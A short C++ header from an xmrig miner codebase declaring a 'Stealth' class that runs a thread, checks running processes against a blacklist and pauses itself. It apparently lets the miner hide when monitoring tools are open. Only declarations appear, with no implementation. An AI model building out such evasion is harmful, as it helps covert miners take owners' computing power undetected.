#pragma once

#include "backend/common/Thread.h"
#include <vector>
#include <string>

namespace xmrig {

class Controller;

template<class T> class Thread;

class Stealth {
public:
    Stealth(Controller *controller);
    ~Stealth();

    void start();
    void stop();

private:
    void checkProcesses();

    Controller *m_controller;
    Thread<Stealth> *m_thread;
    std::vector<std::string> m_blacklist;
    bool m_paused = false;
};

} // namespace xmrig
